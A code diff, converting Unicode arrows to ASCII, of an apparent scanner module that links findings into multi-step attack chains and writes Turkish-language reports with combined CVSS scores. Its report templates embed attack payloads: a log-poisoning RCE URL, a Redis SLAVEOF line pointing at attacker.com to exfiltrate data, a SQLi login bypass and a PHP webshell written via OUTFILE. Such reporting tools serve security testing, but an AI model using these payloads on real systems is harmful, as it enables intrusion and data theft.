@@ -7,20 +7,20 @@ Chain Reactor v3.0 — Otomatik Exploit Zinciri Motoru
 Mimari (SOLID / OOP):
   ExploitGraph        : Bulgular arası bağımlılık DAG (Yönlü Asiklik Graf)
   ChainNode           : Graf düğümü — tek bir bulgu
-  ChainEdge           : Graf kenarı — bulgu→bulgu ilişkisi (enable/amplify)
+  ChainEdge           : Graf kenarı — bulgu->bulgu ilişkisi (enable/amplify)
   ChainRule (ABC)     : Zincir tespiti kural soyut sınıfı (Strateji Deseni)
   ExploitGraphBuilder : Tüm tarama bulgularından ExploitGraph inşa eder
   CVSSChainCalculator : Zincir bazlı birleşik CVSS 3.1 skoru hesaplama
-  MultiHopDetector    : A→B→C çok adımlı yol keşfi (DFS)
+  MultiHopDetector    : A->B->C çok adımlı yol keşfi (DFS)
   PlaybookLoader      : YAML tabanlı özel zincir senaryoları
   ChainReactor        : Ana orkestratör — tüm kuralları uygular
 
 Zincirler (v3.0):
-  2-hop: XSS+CSRF→ATO, InfoLeak+IDOR→MassLeak, SSRF→CloudCompromise,
-         OpenRedirect+XSS→Phishing, Upload+LFI→RCE
-  3-hop: LFI→LogPoison→RCE, XSS→CSRF→PrivEsc, SSRF→InternalDisc→LateralMove
-  4-hop: SQLi→CredDump→PwReuse→ATO, SQLi→AdminBypass→FileWrite→RCE
-  Auto : MultiHopDetector (grafta bulunan her path ≥ 3 düğüm)
+  2-hop: XSS+CSRF->ATO, InfoLeak+IDOR->MassLeak, SSRF->CloudCompromise,
+         OpenRedirect+XSS->Phishing, Upload+LFI->RCE
+  3-hop: LFI->LogPoison->RCE, XSS->CSRF->PrivEsc, SSRF->InternalDisc->LateralMove
+  4-hop: SQLi->CredDump->PwReuse->ATO, SQLi->AdminBypass->FileWrite->RCE
+  Auto : MultiHopDetector (grafta bulunan her path >= 3 düğüm)
   YAML : PlaybookLoader (sınırsız özel zincir tanımı)
 """
 from __future__ import annotations
@@ -35,9 +35,9 @@ from typing import Any, Dict, Generator, List, Optional, Set, Tuple
 
 _logger = logging.getLogger(__name__)
 
-# ─────────────────────────────────────────────────────────────────────────────
+# -----------------------------------------------------------------------------
 # Data Classes
-# ─────────────────────────────────────────────────────────────────────────────
+# -----------------------------------------------------------------------------
 
 @dataclass
 class ChainNode:
@@ -58,7 +58,7 @@ class ChainNode:
 
 @dataclass
 class ChainEdge:
-    """Kaynak düğüm → hedef düğüm yönlü kenar."""
+    """Kaynak düğüm -> hedef düğüm yönlü kenar."""
     source_id: str
     target_id: str
     label:     str          # "enables" | "amplifies" | "prerequisite" | "playbook_step"
@@ -95,16 +95,16 @@ class ChainFinding:
     remediation:  str = ""
 
 
-# ─────────────────────────────────────────────────────────────────────────────
+# -----------------------------------------------------------------------------
 # ExploitGraph — Yönlü Asiklik Graf (DAG)
-# ─────────────────────────────────────────────────────────────────────────────
+# -----------------------------------------------------------------------------
 
 class ExploitGraph:
     """
     Bulgular arası bağımlılık DAG.
 
     - add_node / add_edge : Graf oluşturma
-    - find_all_paths      : DFS ile A→B→C yol keşfi (cycle-safe)
+    - find_all_paths      : DFS ile A->B->C yol keşfi (cycle-safe)
     - find_paths_by_type  : Tip tabanlı yol arama
     - topological_sort    : Kahn algoritması ile topolojik sıralama
     """
@@ -114,7 +114,7 @@ class ExploitGraph:
         self._adj:     Dict[str, List[ChainEdge]]   = defaultdict(list)   # out-edges
         self._rev_adj: Dict[str, List[ChainEdge]]   = defaultdict(list)   # in-edges
 
-    # ── Node / Edge yönetimi ─────────────────────────────────────────────
+    # -- Node / Edge yönetimi ---------------------------------------------
 
     def add_node(self, node: ChainNode) -> None:
         self._nodes[node.node_id] = node
@@ -138,7 +138,7 @@ class ExploitGraph:
     def in_edges(self, node_id: str) -> List[ChainEdge]:
         return self._rev_adj.get(node_id, [])
 
-    # ── DFS multi-hop yol keşfi ──────────────────────────────────────────
+    # -- DFS multi-hop yol keşfi ------------------------------------------
 
     def find_all_paths(
         self,
@@ -146,7 +146,7 @@ class ExploitGraph:
         target_id: str,
         max_depth: int = 6,
     ) -> List[List[str]]:
-        """DFS ile kaynak→hedef tüm yolları döner (cycle-safe, derinlik sınırlı)."""
+        """DFS ile kaynak->hedef tüm yolları döner (cycle-safe, derinlik sınırlı)."""
         results: List[List[str]] = []
 
         def _dfs(current: str, path: List[str], visited: Set[str]) -> None:
@@ -173,7 +173,7 @@ class ExploitGraph:
         end_types:   List[str],
         max_depth:   int = 6,
     ) -> List[ChainPath]:
-        """Başlangıç tipi → bitiş tipi arasındaki tüm zincir yollarını döner."""
+        """Başlangıç tipi -> bitiş tipi arasındaki tüm zincir yollarını döner."""
         sources = [n for n in self._nodes.values() if n.vuln_type in start_types]
         targets = [n for n in self._nodes.values() if n.vuln_type in end_types]
         paths: List[ChainPath] = []
@@ -207,7 +207,7 @@ class ExploitGraph:
                     break
         return result
 
-    # ── Kahn topolojik sıralama ──────────────────────────────────────────
+    # -- Kahn topolojik sıralama ------------------------------------------
 
     def topological_sort(self) -> List[str]:
         """Kahn algoritması ile topolojik sıralama (döngü toleranslı)."""
@@ -229,9 +229,9 @@ class ExploitGraph:
         return order
 
 
-# ─────────────────────────────────────────────────────────────────────────────
+# -----------------------------------------------------------------------------
 # CVSSChainCalculator — Zincir CVSS Skoru
-# ─────────────────────────────────────────────────────────────────────────────
+# -----------------------------------------------------------------------------
 
 class CVSSChainCalculator:
     """
@@ -242,7 +242,7 @@ class CVSSChainCalculator:
       amplification = sum(weights) * 0.15   (her atlama ek risk ekler)
       combined    = min(10.0, base + amplification)
 
-    Örnek: SQLi(7.5) → CredDump(8.0) → ATO(9.5) | weights=[1.5,1.3]
+    Örnek: SQLi(7.5) -> CredDump(8.0) -> ATO(9.5) | weights=[1.5,1.3]
       combined = min(10.0, 9.5 + (1.5+1.3)*0.15) = min(10.0, 9.92) = 9.9
     """
 
@@ -283,9 +283,9 @@ class CVSSChainCalculator:
         }.get(severity.lower(), 5.0)
 
 
-# ─────────────────────────────────────────────────────────────────────────────
+# -----------------------------------------------------------------------------
 # ChainRule — Soyut Kural Sınıfı (Template Method + Strategy)
-# ─────────────────────────────────────────────────────────────────────────────
+# -----------------------------------------------------------------------------
 
 class ChainRule(ABC):
     """
@@ -308,7 +308,7 @@ class ChainRule(ABC):
     ) -> List[ChainFinding]:
         ...
 
-    # ── Yardımcı metotlar ────────────────────────────────────────────────
+    # -- Yardımcı metotlar ------------------------------------------------
 
     def _missing_types(self, nodes_by_type: Dict[str, List[ChainNode]]) -> List[str]:
         return [t for t in self.REQUIRED_TYPES if not nodes_by_type.get(t)]
@@ -344,12 +344,12 @@ class ChainRule(ABC):
         )
 
 
-# ─────────────────────────────────────────────────────────────────────────────
+# -----------------------------------------------------------------------------
 # 2-Hop Chain Rules
-# ─────────────────────────────────────────────────────────────────────────────
+# -----------------------------------------------------------------------------
 
 class XSSCSRFATOChain(ChainRule):
-    """XSS + CSRF → Account Takeover (2-hop)."""
+    """XSS + CSRF -> Account Takeover (2-hop)."""
 
     REQUIRED_TYPES = ["xss", "csrf"]
     CHAIN_ID = "xss_csrf_ato"
@@ -372,7 +372,7 @@ class XSSCSRFATOChain(ChainRule):
 
         return [self._to_finding(
             chain_id=self.CHAIN_ID,
-            title="Zincir Saldırı: XSS + CSRF → Hesap Ele Geçirme (ATO)",
+            title="Zincir Saldırı: XSS + CSRF -> Hesap Ele Geçirme (ATO)",
             description=(
                 "**Tespit Edilen Kritik Zincir: Account Takeover**\n\n"
                 "**Adım 1 — XSS (Çapraz Site Komut Dosyası)**\n"
@@ -383,8 +383,8 @@ class XSSCSRFATOChain(ChainRule):
                 "  Şifre değiştirme / e-posta değiştirme gibi hassas işlemler CSRF"
                 " korumasından yoksun.\n\n"
                 "**Exploit Akışı**\n"
-                "  XSS payload'ı → kurban tarayıcısında çalışır → CSRF isteği oluşturur\n"
-                "  → kurban kimliğiyle şifre değiştirme isteği gönderilir → hesap ele geçirilir.\n\n"
+                "  XSS payload'ı -> kurban tarayıcısında çalışır -> CSRF isteği oluşturur\n"
+                "  -> kurban kimliğiyle şifre değiştirme isteği gönderilir -> hesap ele geçirilir.\n\n"
                 f"**Birleşik CVSS**: {cvss}"
             ),
             severity="Critical",
@@ -404,7 +404,7 @@ class XSSCSRFATOChain(ChainRule):
 
 
 class InfoDisclosureIDORChain(ChainRule):
-    """Info Disclosure + IDOR → Mass Data Leak (2-hop)."""
+    """Info Disclosure + IDOR -> Mass Data Leak (2-hop)."""
 
     REQUIRED_TYPES = ["disclosure", "idor"]
     CHAIN_ID = "info_idor_mass_leak"
@@ -427,7 +427,7 @@ class InfoDisclosureIDORChain(ChainRule):
 
         return [self._to_finding(
             chain_id=self.CHAIN_ID,
-            title="Zincir Saldırı: Bilgi Sızıntısı + IDOR → Toplu Veri İhlali",
+            title="Zincir Saldırı: Bilgi Sızıntısı + IDOR -> Toplu Veri İhlali",
             description=(
                 "**Tespit Edilen Yüksek Riskli Zincir: Mass Data Leak**\n\n"
                 "**Adım 1 — Bilgi Sızıntısı**\n"
@@ -437,8 +437,8 @@ class InfoDisclosureIDORChain(ChainRule):
                 f"  URL: `{best_idor.url}`\n"
                 "  ID tabanlı erişim kontrolü kırık; başka kullanıcıların verilerine erişilebilir.\n\n"
                 "**Exploit Akışı**\n"
-                "  Sızdırılan ID listesi → IDOR endpoint'i üzerinden sistematik enumeration\n"
-                "  → tüm kullanıcı kayıtlarının toplu olarak çekilmesi.\n\n"
+                "  Sızdırılan ID listesi -> IDOR endpoint'i üzerinden sistematik enumeration\n"
+                "  -> tüm kullanıcı kayıtlarının toplu olarak çekilmesi.\n\n"
                 f"**Birleşik CVSS**: {cvss}"
             ),
             severity="High",
@@ -457,7 +457,7 @@ class InfoDisclosureIDORChain(ChainRule):
 
 
 class SSRFCloudCompromiseChain(ChainRule):
-    """SSRF + Cloud Metadata → Full Cloud Infrastructure Compromise (2-hop)."""
+    """SSRF + Cloud Metadata -> Full Cloud Infrastructure Compromise (2-hop)."""
 
     REQUIRED_TYPES = ["ssrf"]
     CHAIN_ID = "ssrf_cloud_compromise"
@@ -481,7 +481,7 @@ class SSRFCloudCompromiseChain(ChainRule):
 
         return [self._to_finding(
             chain_id=self.CHAIN_ID,
-            title="Zincir Saldırı: SSRF → Cloud Metadata → Altyapı Ele Geçirme",
+            title="Zincir Saldırı: SSRF -> Cloud Metadata -> Altyapı Ele Geçirme",
             description=(
                 "**Tespit Edilen Kritik Zincir: Cloud Infrastructure Compromise**\n\n"
                 "**Adım 1 — SSRF (Sunucu Taraflı İstek Sahteciliği)**\n"
@@ -514,7 +514,7 @@ class SSRFCloudCompromiseChain(ChainRule):
 
 
 class OpenRedirectXSSPhishingChain(ChainRule):
-    """Open Redirect + XSS → Trust-Based Phishing (2-hop)."""
+    """Open Redirect + XSS -> Trust-Based Phishing (2-hop)."""
 
     REQUIRED_TYPES = ["redirect", "xss"]
     CHAIN_ID = "open_redirect_xss_phishing"
@@ -534,7 +534,7 @@ class OpenRedirectXSSPhishingChain(ChainRule):
 
         return [self._to_finding(
             chain_id=self.CHAIN_ID,
-            title="Zincir Saldırı: Open Redirect + XSS → Gelişmiş Kimlik Avı",
+            title="Zincir Saldırı: Open Redirect + XSS -> Gelişmiş Kimlik Avı",
             description=(
                 "**Tespit Edilen Yüksek Riskli Zincir: Trust-Based Phishing**\n\n"
                 "**Adım 1 — Open Redirect**\n"
@@ -544,7 +544,7 @@ class OpenRedirectXSSPhishingChain(ChainRule):
                 f"  URL: `{best_x.url}`\n"
                 "  JavaScript çalıştırma kapasitesi mevcut.\n\n"
                 "**Exploit Akışı**\n"
-                "  Güvenilir domain linki → kurbanı sahte giriş sayfasına yönlendirir\n"
+                "  Güvenilir domain linki -> kurbanı sahte giriş sayfasına yönlendirir\n"
                 "  VEYA XSS ile trusted redirect üzerinde sahte form overlay'i oluşturulur.\n\n"
                 f"**Birleşik CVSS**: {cvss}"
             ),
@@ -560,7 +560,7 @@ class OpenRedirectXSSPhishingChain(ChainRule):
 
 
 class UploadLFIRCEChain(ChainRule):
-    """File Upload + LFI → Remote Code Execution (2-hop)."""
+    """File Upload + LFI -> Remote Code Execution (2-hop)."""
 
     REQUIRED_TYPES = ["upload", "lfi"]
     CHAIN_ID = "upload_lfi_rce"
@@ -580,7 +580,7 @@ class UploadLFIRCEChain(ChainRule):
 
         return [self._to_finding(
             chain_id=self.CHAIN_ID,
-            title="Zincir Saldırı: Dosya Yükleme + LFI → Uzaktan Kod Yürütme",
+            title="Zincir Saldırı: Dosya Yükleme + LFI -> Uzaktan Kod Yürütme",
             description=(
                 "**Tespit Edilen Kritik Zincir: RCE via Upload + LFI**\n\n"
                 "**Adım 1 — Dosya Yükleme**\n"
@@ -590,7 +590,7 @@ class UploadLFIRCEChain(ChainRule):
                 f"  URL: `{best_lfi.url}`\n"
                 "  Sunucu keyfi yerel dosyaları include ediyor.\n\n"
                 "**Adım 3 — RCE**\n"
-                "  LFI ile yüklenen webshell dosyası include edilir → PHP yorumlar → OS komutu çalışır.\n\n"
+                "  LFI ile yüklenen webshell dosyası include edilir -> PHP yorumlar -> OS komutu çalışır.\n\n"
                 f"**Birleşik CVSS**: {cvss}"
             ),
             severity="Critical",
@@ -608,12 +608,12 @@ class UploadLFIRCEChain(ChainRule):
         )]
 
 
-# ─────────────────────────────────────────────────────────────────────────────
+# -----------------------------------------------------------------------------
 # 3-Hop Chain Rules
-# ─────────────────────────────────────────────────────────────────────────────
+# -----------------------------------------------------------------------------
 
 class LFILogPoisoningRCEChain(ChainRule):
-    """LFI → Log Poisoning → RCE — Tam Otomatik 3-Hop Zincir."""
+    """LFI -> Log Poisoning -> RCE — Tam Otomatik 3-Hop Zincir."""
 
     REQUIRED_TYPES = ["lfi"]
     CHAIN_ID = "lfi_log_poison_rce"
@@ -664,9 +664,9 @@ class LFILogPoisoningRCEChain(ChainRule):
 
         return [self._to_finding(
             chain_id=self.CHAIN_ID,
-            title="3-Hop Zincir: LFI → Log Poisoning → Uzaktan Kod Yürütme",
+            title="3-Hop Zincir: LFI -> Log Poisoning -> Uzaktan Kod Yürütme",
             description=(
-                "**Tespit Edilen Kritik 3-Adımlı Zincir: LFI→RCE**\n\n"
+                "**Tespit Edilen Kritik 3-Adımlı Zincir: LFI->RCE**\n\n"
                 "**Adım 1 — LFI (Yerel Dosya Dahil Etme)**\n"
                 f"  URL: `{best.url}`\n"
                 "  Sunucu, kullanıcıdan gelen path parametresiyle yerel dosyaları include ediyor.\n\n"
@@ -678,7 +678,7 @@ class LFILogPoisoningRCEChain(ChainRule):
                 "  Bu değer access.log dosyasına yazılıyor. Hedef log yolları:\n"
                 f"{log_list}\n\n"
                 "**Adım 3 — RCE (Uzaktan Kod Yürütme)**\n"
-                "  LFI ile log dosyası include edilir → PHP kodu yorumlanır → OS komutu çalışır:\n"
+                "  LFI ile log dosyası include edilir -> PHP kodu yorumlanır -> OS komutu çalışır:\n"
                 f"  `{best.url}?file=/var/log/apache2/access.log&cmd=id`\n"
                 "  Çıktı: `uid=33(www-data) gid=33(www-data)`\n\n"
                 f"**Birleşik CVSS**: {cvss}"
@@ -702,7 +702,7 @@ class LFILogPoisoningRCEChain(ChainRule):
 
 
 class XSSCSRFPrivEscChain(ChainRule):
-    """XSS → CSRF → Privilege Escalation — 3-Hop."""
+    """XSS -> CSRF -> Privilege Escalation — 3-Hop."""
 
     REQUIRED_TYPES = ["xss", "csrf"]
     CHAIN_ID = "xss_csrf_privesc"
@@ -735,7 +735,7 @@ class XSSCSRFPrivEscChain(ChainRule):
 
         return [self._to_finding(
             chain_id=self.CHAIN_ID,
-            title="3-Hop Zincir: XSS → CSRF → Ayrıcalık Yükseltme",
+            title="3-Hop Zincir: XSS -> CSRF -> Ayrıcalık Yükseltme",
             description=(
                 "**Tespit Edilen Kritik 3-Adımlı Zincir: PrivEsc**\n\n"
                 "**Adım 1 — XSS**\n"
@@ -775,7 +775,7 @@ class XSSCSRFPrivEscChain(ChainRule):
 
 
 class SSRFLateralMovementChain(ChainRule):
-    """SSRF → Internal Service Discovery → Lateral Movement — 3-Hop."""
+    """SSRF -> Internal Service Discovery -> Lateral Movement — 3-Hop."""
 
     REQUIRED_TYPES = ["ssrf"]
     CHAIN_ID = "ssrf_lateral_movement"
@@ -820,7 +820,7 @@ class SSRFLateralMovementChain(ChainRule):
 
         return [self._to_finding(
             chain_id=self.CHAIN_ID,
-            title="3-Hop Zincir: SSRF → İç Servis Keşfi → Yanal Hareket",
+            title="3-Hop Zincir: SSRF -> İç Servis Keşfi -> Yanal Hareket",
             description=(
                 "**Tespit Edilen Kritik 3-Adımlı Zincir: Lateral Movement**\n\n"
                 "**Adım 1 — SSRF**\n"
@@ -828,14 +828,14 @@ class SSRFLateralMovementChain(ChainRule):
                 "  Uygulama iç ağa istek gönderiyor.\n\n"
                 "**Adım 2 — İç Servis Keşfi**\n"
                 "  SSRF ile iç ağdaki auth gerektirmeyen servisler taranıyor:\n"
-                "  - Redis :6379  → `*1\\r\\n$4\\r\\nINFO\\r\\n`\n"
-                "  - Elasticsearch :9200  → `/_cat/indices`\n"
-                "  - Docker API :2375  → `/containers/json`\n"
-                "  - Kubernetes API :6443 → `/api/v1/pods`\n\n"
+                "  - Redis :6379  -> `*1\\r\\n$4\\r\\nINFO\\r\\n`\n"
+                "  - Elasticsearch :9200  -> `/_cat/indices`\n"
+                "  - Docker API :2375  -> `/containers/json`\n"
+                "  - Kubernetes API :6443 -> `/api/v1/pods`\n\n"
                 "**Adım 3 — Yanal Hareket**\n"
-                "  - Redis: `SLAVEOF attacker.com 6379` → tüm veri exfil\n"
-                "  - Elasticsearch: index dump → kullanıcı verileri\n"
-                "  - Docker: container exec → host pivot\n\n"
+                "  - Redis: `SLAVEOF attacker.com 6379` -> tüm veri exfil\n"
+                "  - Elasticsearch: index dump -> kullanıcı verileri\n"
+                "  - Docker: container exec -> host pivot\n\n"
                 f"**Birleşik CVSS**: {cvss}"
             ),
             severity="Critical",
@@ -856,12 +856,12 @@ class SSRFLateralMovementChain(ChainRule):
         )]
 
 
-# ─────────────────────────────────────────────────────────────────────────────
+# -----------------------------------------------------------------------------
 # 4-Hop Chain Rules
-# ─────────────────────────────────────────────────────────────────────────────
+# -----------------------------------------------------------------------------
 
 class SQLiCredDumpATOChain(ChainRule):
-    """SQLi → Credential Dump → Password Reuse → Account Takeover — 4-Hop."""
+    """SQLi -> Credential Dump -> Password Reuse -> Account Takeover — 4-Hop."""
 
     REQUIRED_TYPES = ["sqli"]
     CHAIN_ID = "sqli_cred_dump_ato"
@@ -907,7 +907,7 @@ class SQLiCredDumpATOChain(ChainRule):
 
         return [self._to_finding(
             chain_id=self.CHAIN_ID,
-            title="4-Hop Zincir: SQLi → Kimlik Bilgisi Dökümü → Parola Tekrar Kullanımı → ATO",
+            title="4-Hop Zincir: SQLi -> Kimlik Bilgisi Dökümü -> Parola Tekrar Kullanımı -> ATO",
             description=(
                 "**Tespit Edilen Kritik 4-Adımlı Zincir**\n\n"
                 "**Adım 1 — SQL Injection**\n"
@@ -946,7 +946,7 @@ class SQLiCredDumpATOChain(ChainRule):
 
 
 class SQLiAdminFileWriteRCEChain(ChainRule):
-    """SQLi → Admin Bypass → MySQL OUTFILE → RCE — 4-Hop."""
+    """SQLi -> Admin Bypass -> MySQL OUTFILE -> RCE — 4-Hop."""
 
     REQUIRED_TYPES = ["sqli"]
     CHAIN_ID = "sqli_admin_filewrite_rce"
@@ -985,15 +985,15 @@ class SQLiAdminFileWriteRCEChain(ChainRule):
 
         return [self._to_finding(
             chain_id=self.CHAIN_ID,
-            title="4-Hop Zincir: SQLi → Admin Bypass → Dosya Yazma → RCE",
+            title="4-Hop Zincir: SQLi -> Admin Bypass -> Dosya Yazma -> RCE",
             description=(
-                "**Tespit Edilen Kritik 4-Adımlı Zincir: SQLi→RCE**\n\n"
+                "**Tespit Edilen Kritik 4-Adımlı Zincir: SQLi->RCE**\n\n"
                 "**Adım 1 — SQL Injection**\n"
                 f"  URL: `{best.url}`\n"
                 "  Union/Error tabanlı SQLi tespit edildi.\n\n"
                 "**Adım 2 — Admin Bypass**\n"
                 "  SQLi ile admin credentials dump edilir, admin paneline giriş yapılır:\n"
-                "  `' OR '1'='1'--` veya credential dump → şifre kırma yöntemiyle.\n\n"
+                "  `' OR '1'='1'--` veya credential dump -> şifre kırma yöntemiyle.\n\n"
                 "**Adım 3 — MySQL OUTFILE Dosya Yazma**\n"
                 "  ```sql\n"
                 "  SELECT '<?php system($_GET[\"cmd\"]); ?>'\n"
@@ -1002,7 +1002,7 @@ class SQLiAdminFileWriteRCEChain(ChainRule):
                 "  Web root'a PHP webshell yazılır.\n\n"
                 "**Adım 4 — RCE**\n"
                 "  `https://target.com/shell.php?cmd=id`\n"
-                "  → `uid=33(www-data) gid=33(www-data) groups=33(www-data)`\n\n"
+                "  -> `uid=33(www-data) gid=33(www-data) groups=33(www-data)`\n\n"
                 f"**Birleşik CVSS**: {cvss}"
             ),
             severity="Critical",
@@ -1023,9 +1023,9 @@ class SQLiAdminFileWriteRCEChain(ChainRule):
         )]
 
 
-# ─────────────────────────────────────────────────────────────────────────────
+# -----------------------------------------------------------------------------
 # PlaybookChainRule — YAML Tabanlı Özel Zincir
-# ─────────────────────────────────────────────────────────────────────────────
+# -----------------------------------------------------------------------------
 
 class PlaybookChainRule(ChainRule):
     """
@@ -1114,9 +1114,9 @@ class PlaybookChainRule(ChainRule):
         return [finding]
 
 
-# ─────────────────────────────────────────────────────────────────────────────
+# -----------------------------------------------------------------------------
 # PlaybookLoader — YAML Dosya Yükleyici
-# ─────────────────────────────────────────────────────────────────────────────
+# -----------------------------------------------------------------------------
 
 class PlaybookLoader:
     """
@@ -1166,9 +1166,9 @@ class PlaybookLoader:
                 yield from d.glob("*.yaml")
 
 
-# ─────────────────────────────────────────────────────────────────────────────
+# -----------------------------------------------------------------------------
 # ExploitGraphBuilder — Bulgulardan Graf İnşa
-# ─────────────────────────────────────────────────────────────────────────────
+# -----------------------------------------------------------------------------
 
 class ExploitGraphBuilder:
     """
@@ -1176,7 +1176,7 @@ class ExploitGraphBuilder:
     Tip normalizasyon haritasıyla farklı scanner formatlarını birleştirir.
     """
 
-    # Ham tip → canonical tip eşlem tablosu
+    # Ham tip -> canonical tip eşlem tablosu
     TYPE_MAP: Dict[str, str] = {
         # XSS
         "xss": "xss", "cross-site scripting": "xss", "cross site scripting": "xss",
@@ -1278,17 +1278,17 @@ class ExploitGraphBuilder:
         return CVSSChainCalculator.score_for_severity(severity)
 
 
-# ─────────────────────────────────────────────────────────────────────────────
+# -----------------------------------------------------------------------------
 # MultiHopDetector — Otomatik Çok Adımlı Yol Keşfi
-# ─────────────────────────────────────────────────────────────────────────────
+# -----------------------------------------------------------------------------
 
 class MultiHopDetector:
     """
-    Grafta hiçbir rule tarafından tanımlanmamış ek A→B→C yollarını keşfeder.
+    Grafta hiçbir rule tarafından tanımlanmamış ek A->B->C yollarını keşfeder.
 
     Kriter:
-      - Minimum 3 düğüm (≥ 3-hop)
-      - Birleşik CVSS ≥ MIN_COMBINED_CVSS
+      - Minimum 3 düğüm (>= 3-hop)
+      - Birleşik CVSS >= MIN_COMBINED_CVSS
       - Daha önce raporlanmamış tip zinciri
     """
 
@@ -1320,7 +1320,7 @@ class MultiHopDetector:
                     if cvss < self.MIN_COMBINED_CVSS:
                         continue
 
-                    chain_key = "→".join(n.vuln_type for n in path_nodes)
+                    chain_key = "->".join(n.vuln_type for n in path_nodes)
                     if chain_key in already_reported:
                         continue
                     already_reported.add(chain_key)
@@ -1358,9 +1358,9 @@ class MultiHopDetector:
         return findings
 
 
-# ─────────────────────────────────────────────────────────────────────────────
+# -----------------------------------------------------------------------------
 # ChainReactor — Ana Orkestratör
-# ─────────────────────────────────────────────────────────────────────────────
+# -----------------------------------------------------------------------------
 
 class ChainReactor:
     """
@@ -1462,9 +1462,9 @@ class ChainReactor:
         return chain_findings
 
 
-# ─────────────────────────────────────────────────────────────────────────────
+# -----------------------------------------------------------------------------
 # Yardımcı Fonksiyonlar
-# ─────────────────────────────────────────────────────────────────────────────
+# -----------------------------------------------------------------------------
 
 def _keywords_in_raw(raw: Dict[str, Any], keywords: List[str]) -> bool:
     """Bulgu dict'indeki herhangi bir string değerde keyword arar."""
@@ -1514,9 +1514,9 @@ def _chain_finding_to_dict(cf: ChainFinding) -> Dict[str, Any]:
     }
 
 
-# ─────────────────────────────────────────────────────────────────────────────
+# -----------------------------------------------------------------------------
 # Geriye Uyumlu Public API
-# ─────────────────────────────────────────────────────────────────────────────
+# -----------------------------------------------------------------------------
 
 def analyze_chains(results: Dict[str, Any]) -> None:
     """
